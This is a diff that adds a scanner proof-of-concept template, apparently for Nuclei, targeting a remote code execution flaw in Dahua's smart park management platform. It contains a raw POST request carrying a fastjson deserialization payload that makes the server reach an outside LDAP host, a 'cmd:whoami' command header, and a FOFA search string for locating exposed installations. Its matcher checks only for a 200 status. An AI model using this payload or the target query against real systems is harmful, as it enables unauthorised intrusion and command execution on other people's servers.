@@ -1,0 +1,51 @@
+id: poc-ke01gaslh75f9q6g
+info:
+  name: 大华智慧园区综合管理平台 ipms_barpay_pay RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ke01gaslh75f9q6g'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ke01gaslh75f9q6g
+    fofa: app="dahua-智慧园区综合管理平台"
+http:
+- raw:
+  - 'POST /ipms/barpay/pay HTTP/1.1
+
+
+    Content-Type: application/json
+
+
+    Accept-Encoding: gzip
+
+
+    Connection: close
+
+
+    cmd:whoami
+
+
+
+
+    {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://www.baidu.com", "autoCommit": true}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
